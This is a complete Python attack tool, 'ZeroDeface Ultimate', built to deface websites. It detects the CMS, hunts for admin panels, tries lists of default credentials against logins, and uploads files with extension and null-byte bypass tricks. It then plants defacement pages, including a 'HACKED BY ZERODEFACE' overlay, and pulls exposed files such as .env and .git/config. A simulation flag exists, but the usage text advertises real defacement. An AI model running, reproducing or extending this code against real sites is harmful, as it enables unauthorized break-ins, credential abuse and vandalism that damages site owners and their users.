#!/usr/bin/env python3
import argparse
import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import os
import time
import random
import json
from datetime import datetime
import sys
import re
import threading
from queue import Queue

args = None 
requests.packages.urllib3.disable_warnings()

class DefacementScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5'
        })
        self.vulnerabilities = []
        self.uploaded_files = []
        self.discovered_urls = set()
        self.crawl_queue = Queue()
        self.threads = []
        self.stop_flag = False
        self.defacement_success = False
        
        # Enhanced CMS detection patterns
        self.cms_patterns = {
            'WordPress': [
                r'wp-content', r'wp-includes', r'/wp-admin/', 
                r'wordpress', r'generator" content="WordPress'
            ],
            'Joomla': [
                r'/joomla/', r'com_joomla', r'Joomla!',
                r'media/system/js/', r'index.php?option=com_'
            ],
            'Drupal': [
                r'/sites/all/', r'drupal.js', r'Drupal.settings',
                r'name="generator" content="Drupal'
            ],
            'Magento': [
                r'/skin/frontend/', r'Magento/', r'/media/js/mage/',
                r'var Mage ='
            ],
            'OpenCart': [
                r'/catalog/view/theme/', r'/index.php?route=',
                r'Powered By OpenCart'
            ]
        }
        
        # Comprehensive admin paths for all major CMS
        self.admin_paths = self._load_admin_paths()
        
        # Enhanced file upload testing
        self.test_content = "ZERODEFACE_SECURITY_TEST_"
        self.test_patterns = [
            "DEFACED_BY_", "HACKED_BY", "SECURITY_TEST", 
            "VULNERABLE_TO_UPLOAD", "TEST_ID:", "ZERODEFACE",
            "simulated defacement", "hacked by security test"
        ]
        
        # Default credentials for various CMS
        self.default_credentials = self._load_credentials()
        
        # Rate limiting control
        self.last_request_time = 0
        self.min_request_interval = 0.5  # seconds

        # Defacement content with multiple templates
        self.defacement_templates = [
            """<!DOCTYPE html>
<html>
<head>
    <title>Security Test Defacement</title>
    <style>
        body { background: #000; color: #fff; text-align: center; padding: 50px; }
        h1 { color: #f00; }
    </style>
</head>
<body>
    <h1>SECURITY TEST ONLY</h1>
    <p>This is a simulated defacement for security testing purposes</p>
    <p>Vulnerability: Unprotected File Upload</p>
    <footer>Test ID: ZD-{RANDOM_ID} | {TIMESTAMP}</footer>
</body>
</html>""",
            """<?php
// Simple PHP defacement
echo "<html><body style='background:#000;color:#fff;text-align:center;padding:50px;'>";
echo "<h1 style='color:red'>SECURITY TEST</h1>";
echo "<p>This system is vulnerable to file upload attacks</p>";
echo "<p>Test ID: ZD-{RANDOM_ID}</p>";
echo "</body></html>";
?>""",
            """<html>
<!-- Basic HTML defacement -->
<body onload="document.body.style.backgroundColor='black'">
    <div style="color:white;text-align:center;margin-top:100px">
        <h1>SECURITY TEST</h1>
        <p>This page was uploaded as part of a security test</p>
        <p>Test ID: ZD-{RANDOM_ID}</p>
    </div>
</body>
</html>"""
        ]

        # File extensions and content types for bypass attempts
        self.upload_test_cases = [
            # Normal extensions
            ('index.html', 'text/html'),
            ('index.php', 'application/x-php'),
            ('test.htm', 'text/html'),
            
            # Double extensions
            ('test.html.jpg', 'image/jpeg'),
            ('image.php.png', 'image/png'),
            ('file.html.gif', 'image/gif'),
            
            # Null byte injections
            ('shell.php%00.jpg', 'image/jpeg'),
            ('test.html%00.png', 'image/png'),
            
            # Case manipulation
            ('Index.HtMl', 'text/html'),
            ('INDEX.PHP', 'application/x-php'),
            
            # Extra extensions
            ('test.php.jpg', 'image/jpeg'),
            ('test.php.test', 'text/plain'),
            
            # CMS-specific
            ('wp-config.php', 'application/x-php'),
            ('configuration.php', 'application/x-php')
        ]

    def _load_admin_paths(self):
        """Load comprehensive list of admin paths for all major CMS"""
        paths = [
            # Generic admin paths
            'admin', 'administrator', 'backend', 'manager', 'panel',
            'adminpanel', 'admincp', 'admin_area', 'controlpanel',
            'moderator', 'webadmin', 'sysadmin', 'admin123',
            'admin/admin', 'admin/login', 'admin_area/admin',
            
            # WordPress
            'wp-admin', 'wp-login.php', 'wp-admin/admin-ajax.php',
            'wordpress/wp-admin', 'blog/wp-admin',
            
            # Joomla
            'administrator', 'joomla/administrator',
            'administrator/index.php', 'admin/index.php',
            
            # Drupal
            'user/login', 'admin', 'admin/config',
            'admin/content', 'admin/modules',
            
            # Magento
            'adminhtml', 'admin/login', 'admin/dashboard',
            
            # OpenCart
            'admin', 'admin/index.php?route=common/dashboard',
            
            # Other CMS
            'bolt/login', 'concrete5/login', 'prestashop/admin',
            'umbraco/', 'sitecore/login', 'orchard/admin',
            
            # API endpoints
            'api/admin', 'rest/admin', 'graphql/admin',
            
            # Version specific
            'admin2023', 'admin2024', 'admin2025',
            'admin_v2', 'admin_new', 'admin_old'
        ]
        
        # Add numbered variations
        paths.extend([f'admin{i}' for i in range(1, 10)])
        paths.extend([f'administrator{i}' for i in range(1, 5)])
        
        return list(set(paths))  # Remove duplicates

    def _load_credentials(self):
        """Load comprehensive default credentials database"""
        return {
            'generic': [
                ('admin', 'admin'), ('admin', 'password'), 
                ('administrator', 'administrator'), ('root', 'toor'),
                ('test', 'test'), ('admin', '123456'), 
                ('admin', 'admin123'), ('admin', 'welcome'),
                ('admin', 'password123'), ('admin', 'qwerty')
            ],
            'WordPress': [
                ('admin', 'admin'), ('wpadmin', 'wpadmin'),
                ('administrator', 'password'), ('editor', 'editor')
            ],
            'Joomla': [
                ('admin', 'admin'), ('superuser', 'superuser'),
                ('administrator', 'administrator')
            ],
            'Drupal': [
                ('admin', 'admin'), ('drupal', 'drupal'),
                ('admin', 'password')
            ],
            'Magento': [
                ('admin', 'admin123'), ('admin', 'password123'),
                ('admin', 'magento')
            ],
            'OpenCart': [
                ('admin', 'admin'), ('demo', 'demo'),
                ('admin', 'opencart')
            ]
        }

    def print_banner(self):
        banner = r"""
__________                 ________          _____                     
\____    /___________  ____\______ \   _____/ ____\____    ____  ____  
  /     // __ \_  __ \/  _ \|    |  \_/ __ \   __\\__  \ _/ ___\/ __ \ 
 /     /\  ___/|  | \(  <_> )    `   \  ___/|  |   / __ \\  \__\  ___/ 
/_______ \___  >__|   \____/_______  /\___  >__|  (____  /\___  >___  >
        \/   \/                    \/     \/           \/     \/    \/ 
        """
        print("\033[1;31m" + banner + "\033[0m")
        print("\033[1;37mZeroDeface Ultimate v3.2 - Complete Website Defacement Scanner\033[0m")
        print("\033[1;33mAdvanced CMS Detection | Comprehensive Admin Finder | Enhanced Defacement Tools\033[0m\n")

    def show_menu(self):
        print("""\033[33m
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█                                     𝗠𝗘𝗡𝗨                                                                    
█=====================================================================================█
█ 1.  Scan Entire Website             | 9.  Test File Upload Vulnerabilities          █
█ 2.  Scan for Admin Panels           | 10. Attempt Defacement                       █
█ 3.  Crawl Website                   | 11. Mirror Attack Defacement                  █
█ 4.  Test Default Credentials        | 12. Generate Scan Report                     █
█ 5.  Scan Other Vulnerabilities      | 13. Cleanup Test Files                       █
█ 6.  Detect CMS                      | 14. List Discovered URLs                     █  
█ 7.  Test WebDAV                     | 15. Show Vulnerability Log                   █
█ 8.  Check Common Files              | 16. Exit                                     █
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
\033[0m""")

    def interactive_mode(self):
        """Launch interactive menu-driven mode"""
        self.print_banner()
        while True:
            self.show_menu()
            choice = input("\n\033[1;37mZeroDeface>\033[0m ").strip()
            
            if choice == "1":
                self.scan_entire_site()
            elif choice == "2":
                self.scan_admin_panels()
            elif choice == "3":
                self.crawl_website()
            elif choice == "4":
                if not self.admin_paths:
                    self.scan_admin_panels()
                for url in [urljoin(self.target_url, path) for path in self.admin_paths]:
                    if self.is_login_page(self.session.get(url, verify=False)):
                        self.test_credentials(url)
            elif choice == "5":
                self.scan_other_vulnerabilities()
            elif choice == "6":
                response = self.session.get(self.target_url, verify=False)
                cms = self.detect_cms(response)
                print(f"[*] Detected CMS: {cms}")
            elif choice == "7":
                self.test_webdav()
            elif choice == "8":
                self.scan_other_vulnerabilities()
            elif choice == "9":
                self.scan_upload_vulnerabilities()
            elif choice == "10":
                self.attempt_defacement(self.target_url)
            elif choice == "11":
                self.mirror_attack()
            elif choice == "12":
                report_file = input("Enter report filename: ").strip()
                self.generate_report(report_file)
            elif choice == "13":
                self.cleanup()
            elif choice == "14":
                print("\n".join(self.discovered_urls))
            elif choice == "15":
                for vuln in self.vulnerabilities:
                    print(f"{vuln['category']}: {vuln['description']}")
            elif choice == "16":
                print("[*] Exiting ZeroDeface...")
                break
            else:
                print("[-] Invalid choice. Please select 1-16")
            
            # Pause before showing menu again
            if choice != "16":
                input("\nPress Enter to return to menu...")
                print("\033[F\033[K", end="")  # Move cursor up and clear line

    def upload_file(self, url, content):
        """Attempt to upload a file to the target URL"""
        try:
            # Try PUT method first (common in WebDAV)
            response = self.session.put(
                url,
                data=content,
                headers={'Content-Type': 'text/html'},
                verify=False,
                timeout=10
            )
            
            if response.status_code in [200, 201, 204]:
                return True
            
            # If PUT fails, try POST (for form-based uploads)
            files = {'file': ('index.html', content)}
            response = self.session.post(
                url,
                files=files,
                verify=False,
                timeout=10
            )
            
            return response.status_code == 200
            
        except Exception as e:
            if args.verbose:
                print(f"[-] Upload failed to {url}: {str(e)}")
            return False

    def mirror_attack(self):
        """Advanced mirroring attack with upload vulnerability exploitation"""
        try:
            print("\n[+] Starting Mirror Attack...")
            
            # 1. Clone the target page
            response = self.session.get(self.target_url, verify=False, timeout=15)
            original_html = response.text
            
            # 2. Inject defacement
            defacement = """
            <div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;padding:20px;text-align:center;z-index:9999;">
            HACKED BY ZERODEFACE</div>
            """
            modified_html = original_html.replace('</body>', f'{defacement}</body>')
            
            # 3. Find upload locations
            upload_paths = [
                'wp-content/uploads',
                'images', 
                'assets',
                'files',
                'media'
            ]
            
            # 4. Mass upload
            for path in upload_paths:
                upload_url = urljoin(self.target_url, path + "/index.html")
                if self.upload_file(upload_url, modified_html):
                    print(f"[+] Defacement uploaded to: {path}")
                    self.log_vulnerability(
                        "Mirror Attack Successful",
                        f"Deployed mirror defacement to {path}",
                        exploit=f"Visit {upload_url}",
                        proof="Full page takeover with persistent overlay"
                    )
            return True
            
        except Exception as e:
            print(f"[-] Mirror attack failed: {str(e)}")
            return False

    def rate_limit(self):
        """Enforce rate limiting to avoid detection"""
        elapsed = time.time() - self.last_request_time
        if elapsed < self.min_request_interval:
            time.sleep(self.min_request_interval - elapsed)
        self.last_request_time = time.time()

    def log_vulnerability(self, category, description, exploit=None, proof=None):
        vuln = {
            'category': category,
            'description': description,
            'timestamp': datetime.now().isoformat(),
            'exploit': exploit,
            'proof': proof
        }
        self.vulnerabilities.append(vuln)
        print(f"\033[1;31m[!] {category} found:\033[0m {description}")

    def generate_defacement_content(self):
        """Generate random defacement content"""
        template = random.choice(self.defacement_templates)
        return template.replace("{RANDOM_ID}", str(random.randint(10000, 99999))) \
                      .replace("{TIMESTAMP}", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

    def detect_cms(self, response):
        """Detect CMS using multiple indicators"""
        content = response.text
        headers = str(response.headers).lower()
        
        for cms, patterns in self.cms_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    return cms
                    
        # Check headers
        if 'x-powered-by' in headers:
            if 'wordpress' in headers:
                return 'WordPress'
            elif 'joomla' in headers:
                return 'Joomla'
            elif 'drupal' in headers:
                return 'Drupal'
                
        return 'Unknown CMS'

    def scan_admin_panels(self):
        """Comprehensive admin panel scanning with CMS-specific detection"""
        print("[*] Scanning for admin panels with deep CMS detection...")
        found = False
        
        # First get homepage to detect CMS
        try:
            self.rate_limit()
            response = self.session.get(self.target_url, verify=False, timeout=15)
            cms = self.detect_cms(response)
            print(f"[*] Detected CMS: {cms}")
        except Exception as e:
            print(f"[-] Error detecting CMS: {e}")
            cms = 'Unknown'
        
        # Check CMS-specific admin paths first
        cms_paths = {
            'WordPress': ['wp-admin', 'wp-login.php'],
            'Joomla': ['administrator'],
            'Drupal': ['user/login', 'admin'],
            'Magento': ['admin'],
            'OpenCart': ['admin']
        }.get(cms, [])
        
        # Test all paths with priority to detected CMS
        for path in cms_paths + self.admin_paths:
            if self.stop_flag:
                break
                
            admin_url = urljoin(self.target_url, path)
            if admin_url in self.discovered_urls:
                continue
                
            try:
                self.rate_limit()
                response = self.session.get(
                    admin_url,
                    verify=False,
                    timeout=15,
                    allow_redirects=False
                )
                
                if response.status_code in [200, 301, 302, 403]:
                    if self.is_admin_interface(response):
                        self.log_vulnerability(
                            "Admin Interface Found",
                            f"Admin panel at {admin_url} (Status: {response.status_code})",
                            exploit=f"Visit {admin_url}",
                            proof=self.extract_admin_evidence(response)
                        )
                        found = True
                        
                        if self.is_login_page(response):
                            self.test_credentials(admin_url, cms)
                            
            except Exception as e:
                if not args.quiet:
                    print(f"[-] Error checking {admin_url}: {str(e)[:50]}...")
                    
        return found

    def is_admin_interface(self, response):
        """Determine if response is an admin interface"""
        content = response.text.lower()
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Check for login forms
        login_form = soup.find('form') and (
            soup.find('input', {'type': 'password'}) or
            any(x in content for x in ['login', 'sign in', 'password'])
        )
        
        # Check for admin indicators
        admin_indicators = [
            'dashboard', 'control panel', 'admin area',
            'wp-admin', 'administrator', 'cms', 'manager',
            'logout', 'remember me', 'forgot password',
            'admin console', 'secure login', 'backoffice'
        ]
        admin_content = any(indicator in content for indicator in admin_indicators)
        
        # Check page title
        title = soup.find('title')
        admin_title = title and any(
            word in title.text.lower() 
            for word in ['admin', 'login', 'dashboard', 'control', 'panel']
        )
        
        return login_form or admin_content or admin_title

    def is_login_page(self, response):
        """Check if page contains login form elements"""
        soup = BeautifulSoup(response.text, 'html.parser')
        return (soup.find('input', {'type': 'password'}) is not None or
                'login' in response.text.lower())

    def test_credentials(self, login_url, cms='generic'):
        """Test default credentials with improved detection"""
        print(f"[*] Testing default credentials for {cms} at {login_url}")
        
        credentials = self.default_credentials.get(cms, []) + self.default_credentials['generic']
        
        for username, password in credentials:
            if self.stop_flag:
                break
                
            try:
                # Try both form and JSON login
                for payload in [
                    {'username': username, 'password': password, 'login': 'submit'},
                    {'user': username, 'pass': password, 'submit': 'login'},
                    {'email': username, 'password': password, 'action': 'login'}
                ]:
                    self.rate_limit()
                    response = self.session.post(
                        login_url,
                        data=payload,
                        verify=False,
                        timeout=15,
                        allow_redirects=False
                    )
                    
                    if self.is_login_successful(response, login_url):
                        self.log_vulnerability(
                            "Default Credentials",
                            f"Working credentials: {username}/{password}",
                            exploit=f"curl -X POST -d 'username={username}&password={password}' {login_url}",
                            proof=f"Successful login to {login_url}"
                        )
                        return True
                        
            except Exception as e:
                continue
                
        return False

    def is_login_successful(self, response, original_url):
        """Determine if login attempt was successful"""
        # Check for redirect to different page
        if response.status_code in [301, 302]:
            if response.headers.get('Location') and response.headers['Location'] != original_url:
                return True
                
        # Check content for success indicators
        content = response.text.lower()
        success_indicators = [
            'logout', 'dashboard', 'welcome', 'my account',
            'successful login', 'logged in as'
        ]
        
        return any(indicator in content for indicator in success_indicators)

    def extract_admin_evidence(self, response):
        """Extract relevant evidence from admin page"""
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Get page title
        title = soup.find('title')
        title_text = title.text if title else 'No title found'
        
        # Get forms
        forms = soup.find_all('form')
        form_info = [f"Form action: {form.get('action', '')}" for form in forms[:2]]
        
        # Get meta generator
        meta = soup.find('meta', {'name': 'generator'})
        meta_info = f"Generator: {meta['content']}" if meta else ''
        
        return f"{title_text}\n{meta_info}\n" + "\n".join(form_info)

    def crawl_website(self, max_pages=50):
        """Crawl the website to discover hidden pages"""
        print(f"[*] Crawling {self.target_url} (max {max_pages} pages)...")
        self.discovered_urls.add(self.target_url)
        self.crawl_queue.put(self.target_url)
        
        # Start crawl threads
        for i in range(args.threads):
            t = threading.Thread(target=self._crawl_worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
            
        # Wait for crawling to complete
        self.crawl_queue.join()
        self.stop_flag = True
        
        for t in self.threads:
            t.join()
            
        print(f"[*] Crawling complete. Found {len(self.discovered_urls)} URLs")

    def _crawl_worker(self):
        """Worker thread for crawling"""
        while not self.stop_flag:
            try:
                url = self.crawl_queue.get(timeout=1)
                
                try:
                    self.rate_limit()
                    response = self.session.get(url, verify=False, timeout=10)
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Find all links
                    for link in soup.find_all('a', href=True):
                        if self.stop_flag:
                            break
                            
                        href = link['href'].split('#')[0].split('?')[0].strip()
                        if href and not href.startswith(('javascript:', 'mailto:', 'tel:')):
                            absolute_url = urljoin(url, href)
                            if absolute_url.startswith(self.target_url):
                                if absolute_url not in self.discovered_urls and len(self.discovered_urls) < args.max_pages:
                                    self.discovered_urls.add(absolute_url)
                                    self.crawl_queue.put(absolute_url)
                                    
                                    # Check if this is an admin page
                                    if 'admin' in absolute_url.lower() or 'login' in absolute_url.lower():
                                        try:
                                            self.rate_limit()
                                            admin_response = self.session.get(absolute_url, verify=False, timeout=10)
                                            if self.is_admin_interface(admin_response):
                                                self.log_vulnerability(
                                                    "Hidden Admin Panel",
                                                    f"Discovered admin interface at {absolute_url} (via crawling)",
                                                    exploit=f"Visit {absolute_url}",
                                                    proof=admin_response.text[:300] + "..."
                                                )
                                                
                                                if self.is_login_page(admin_response):
                                                    self.test_credentials(absolute_url)
                                        except:
                                            continue
                                    
                except Exception as e:
                    if args.verbose:
                        print(f"[-] Error crawling {url}: {str(e)[:50]}...")
                        
                finally:
                    self.crawl_queue.task_done()
                    
            except:
                break

    def scan_upload_vulnerabilities(self):
        """Enhanced file upload vulnerability scanning with defacement capability"""
        print("[*] Scanning for file upload vulnerabilities with advanced techniques...")
        found = False
        
        # 1. Check standard file upload forms
        forms = self.crawl_for_forms()
        for form in forms:
            if form.find('input', {'type': 'file'}):
                action = form.get('action', '') or self.target_url
                method = form.get('method', 'post').lower()
                print(f"[*] Found file upload form at {action} (Method: {method})")
                
                if self.test_advanced_file_upload(form, action, method):
                    found = True
                    if args.deface:
                        self.attempt_defacement(action, method)
        
        # 2. Check common upload paths
        common_upload_paths = [
            'upload', 'file-upload', 'upload-file', 'admin/upload',
            'wp-content/plugins/formcraft/file-upload/server/php/',
            'assets/upload', 'includes/upload', 'components/com_media/upload'
        ]
        
        for path in common_upload_paths:
            upload_url = urljoin(self.target_url, path)
            try:
                self.rate_limit()
                response = self.session.get(upload_url, verify=False, timeout=10)
                
                if response.status_code == 200 and any(
                    indicator in response.text.lower() 
                    for indicator in ['upload', 'file', 'submit', 'browse']
                ):
                    print(f"[*] Found potential upload endpoint at {upload_url}")
                    if self.test_upload_endpoint(upload_url):
                        found = True
                        if args.deface:
                            self.attempt_defacement(upload_url, 'post')
                            
            except Exception as e:
                continue
                
        return found

    def crawl_for_forms(self):
        """Find all forms on a page"""
        try:
            self.rate_limit()
            response = self.session.get(self.target_url, verify=False, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            return soup.find_all('form')
        except Exception as e:
            print(f"[-] Error crawling for forms: {e}")
            return []

    def test_advanced_file_upload(self, form, action_url, method='post'):
        """Test file upload with advanced evasion techniques"""
        print("[*] Testing file upload with advanced techniques...")
        
        for filename, content_type in self.upload_test_cases:
            # Generate content based on file type
            if filename.endswith('.php'):
                content = '<?php echo "ZERODEFACE_TEST: " . $_SERVER["HTTP_HOST"]; ?>'
            else:
                content = self.generate_defacement_content()
            
            try:
                files = {'file': (filename, content, content_type)}
                data = {'submit': 'upload', 'id': 'test123'}
                
                # Add extra headers for bypass attempts
                headers = {
                    'X-Forwarded-For': '127.0.0.1',
                    'Referer': self.target_url
                }
                
                self.rate_limit()
                if method == 'post':
                    response = self.session.post(
                        action_url,
                        files=files,
                        data=data,
                        headers=headers,
                        verify=False,
                        timeout=15
                    )
                else:
                    response = self.session.request(
                        method,
                        action_url,
                        files=files,
                        data=data,
                        headers=headers,
                        verify=False,
                        timeout=15
                    )
                
                # Check if upload was successful
                if response.status_code in [200, 201, 302]:
                    file_url = self.find_uploaded_file(response, filename)
                    if file_url:
                        self.rate_limit()
                        file_response = self.session.get(file_url, verify=False, timeout=10)
                        if file_response.status_code == 200:
                            if self.verify_upload_success(file_response, filename):
                                self.log_vulnerability(
                                    "Advanced File Upload Vulnerability",
                                    f"File upload possible at {action_url} - {filename} accessible at {file_url}",
                                    exploit=self.generate_upload_exploit(action_url, filename),
                                    proof=file_response.text[:500] + "..."
                                )
                                self.uploaded_files.append(file_url)
                                return True
                                
            except Exception as e:
                if args.verbose:
                    print(f"[-] Upload test failed for {filename}: {str(e)[:50]}...")
                
        return False

    def find_uploaded_file(self, response, filename):
        """Determine URL of uploaded file"""
        # Try simple URL join first
        file_url = urljoin(response.url, filename)
        
        # Check if URL exists
        try:
            self.rate_limit()
            test_response = self.session.head(file_url, verify=False, timeout=5)
            if test_response.status_code == 200:
                return file_url
        except:
            pass
            
        # Try to find link in response
        soup = BeautifulSoup(response.text, 'html.parser')
        for link in soup.find_all('a', href=True):
            if filename in link['href']:
                return urljoin(response.url, link['href'])
                
        return None

    def verify_upload_success(self, response, filename):
        """Verify file was uploaded successfully"""
        content = response.text
        return (self.test_content in content or
                filename.split('.')[0] in content or
                any(pattern in content for pattern in self.test_patterns))

    def generate_upload_exploit(self, url, filename):
        """Generate exploit code for successful upload"""
        return f"""# File upload exploit
curl -F 'file=@{filename}' {url}

# Access uploaded file
curl {urljoin(url, filename)}"""

    def attempt_defacement(self, upload_url, method='post'):
        """Attempt to upload and deploy defacement page"""
        if not args.simulate:
            print("\033[1;31m[!] WARNING: REAL DEFACEMENT ATTEMPT ENABLED\033[0m")
        
        print("[*] Attempting defacement...")
        
        # Try multiple defacement approaches
        for filename, content_type in [
            ('index.html', 'text/html'),
            ('index.php', 'application/x-php'),
            ('default.html', 'text/html'),
            ('home.html', 'text/html')
        ]:
            content = self.generate_defacement_content()
            
            try:
                if args.simulate:
                    print(f"[SIMULATION] Would upload defacement as {filename} to {upload_url}")
                    self.defacement_success = True
                    return True
                
                # Real upload attempt
                files = {'file': (filename, content, content_type)}
                data = {'submit': 'upload'}
                
                self.rate_limit()
                if method == 'post':
                    response = self.session.post(upload_url, files=files, data=data, verify=False, timeout=15)
                else:
                    response = self.session.request(method, upload_url, files=files, data=data, verify=False, timeout=15)
                
                if response.status_code in [200, 201, 302]:
                    deface_url = urljoin(upload_url, filename)
                    self.rate_limit()
                    check = self.session.get(deface_url, verify=False, timeout=10)
                    if check.status_code == 200:
                        self.log_vulnerability(
                            "Successful Defacement",
                            f"Deployed defacement page to {deface_url}",
                            exploit=f"curl -F 'file=@{filename}' {upload_url}",
                            proof=check.text[:200] + "..."
                        )
                        self.defacement_success = True
                        self.uploaded_files.append(deface_url)
                        return True
                        
            except Exception as e:
                print(f"[-] Defacement attempt failed for {filename}: {e}")
        
        return False

    def scan_entire_site(self):
        """Complete site scanning including crawling"""
        print("[*] Starting comprehensive site scan...")
        
        # Phase 1: Crawl the site
        if args.crawl:
            self.crawl_website()
        
        # Phase 2: Admin panel detection
        if args.admin or args.all:
            self.scan_admin_panels()
        
        # Phase 3: File upload tests
        if args.upload or args.all:
            self.scan_upload_vulnerabilities()
        
        # Phase 4: Other vulnerability checks
        if args.all:
            self.scan_other_vulnerabilities()
            
        print("[*] Comprehensive scan completed")

    def scan_other_vulnerabilities(self):
        """Scan for other common vulnerabilities"""
        print("[*] Scanning for other common vulnerabilities...")
        
        # Check for common files
        common_files = [
            'robots.txt', '.git/config', '.env',
            'phpinfo.php', 'test.php', 'info.php'
        ]
        
        for file in common_files:
            try:
                self.rate_limit()
                url = urljoin(self.target_url, file)
                response = self.session.get(url, verify=False, timeout=10)
                if response.status_code == 200:
                    self.log_vulnerability(
                        "Sensitive File Exposed",
                        f"Sensitive file found at {url}",
                        exploit=f"curl {url}",
                        proof=response.text[:200] + "..."
                    )
            except:
                continue

    def generate_report(self, filename):
        """Generate detailed JSON report"""
        report = {
            'target': self.target_url,
            'scan_date': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'uploaded_files': self.uploaded_files,
            'discovered_urls': list(self.discovered_urls),
            'defacement_success': self.defacement_success
        }
        
        try:
            with open(filename, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"[+] Report saved to {filename}")
        except Exception as e:
            print(f"[-] Error saving report: {e}")

    def cleanup(self):
        """Clean up test files and resources"""
        print("[*] Cleaning up test files...")
        for file_url in self.uploaded_files:
            try:
                self.rate_limit()
                self.session.delete(file_url, verify=False, timeout=10)
                print(f"[*] Cleaned up test file at {file_url}")
            except:
                print(f"[-] Failed to clean up test file at {file_url}")
                
        self.session.close()
        self.stop_flag = True

def main():
    parser = argparse.ArgumentParser(
        description='ZeroDeface Ultimate v3.2 - Complete Website Defacement Scanner',
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""\033[1;34m
Examples:
  Full scan:       python deface_scanner.py --url http://example.com --all
  Admin scan:      python deface_scanner.py --url http://example.com --admin --brute
  Upload test:     python deface_scanner.py --url http://example.com --upload --deface --simulate
  Real defacement: python deface_scanner.py --url http://example.com --upload --deface
  Mirror attack:   python deface_scanner.py --url http://example.com --mirror
  Interactive:     python deface_scanner.py --url http://example.com --interactive
\033[0m"""
    )
    
    parser.add_argument('--url', required=True, help='Target URL to scan')
    parser.add_argument('--admin', action='store_true', help='Scan for admin panels')
    parser.add_argument('--brute', action='store_true', help='Test default credentials')
    parser.add_argument('--upload', action='store_true', help='Test file upload vulnerabilities')
    parser.add_argument('--deface', action='store_true', help='Attempt defacement if upload is vulnerable')
    parser.add_argument('--mirror', action='store_true', help='Execute mirror attack defacement')
    parser.add_argument('--simulate', action='store_true', help='Safe simulation mode (no real changes)')
    parser.add_argument('--crawl', action='store_true', help='Crawl the entire site')
    parser.add_argument('--all', action='store_true', help='Run all vulnerability checks')
    parser.add_argument('--report', help='Save results to JSON file')
    parser.add_argument('--verbose', action='store_true', help='Show detailed scan progress')
    parser.add_argument('--quiet', action='store_true', help='Only show critical findings')
    parser.add_argument('--threads', type=int, default=5, help='Number of threads for crawling')
    parser.add_argument('--max-pages', type=int, default=100, help='Maximum pages to crawl')
    parser.add_argument('--timeout', type=int, default=15, help='Request timeout in seconds')
    parser.add_argument('--interactive', action='store_true', help='Launch interactive menu mode')
    
    global args
    args = parser.parse_args()
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    try:
        scanner = DefacementScanner(args.url)
        
        if args.interactive:
            scanner.interactive_mode()
        else:
            scanner.print_banner()
            if args.all:
                scanner.scan_entire_site()
            else:
                if args.admin or args.brute:
                    scanner.scan_admin_panels()
                if args.upload or args.deface:
                    scanner.scan_upload_vulnerabilities()
                if args.crawl:
                    scanner.crawl_website()
                if args.mirror:
                    scanner.mirror_attack()
                
            if args.report:
                scanner.generate_report(args.report)
                
            if not scanner.vulnerabilities and not args.quiet:
                print("\033[1;32m[+] No vulnerabilities found.\033[0m")
                
    except KeyboardInterrupt:
        print("\n\033[1;33m[!] Scan interrupted by user\033[0m")
    except Exception as e:
        print(f"\033[1;31m[-] Fatal error: {e}\033[0m")
    finally:
        if 'scanner' in locals():
            scanner.cleanup()

if __name__ == '__main__':
    main()
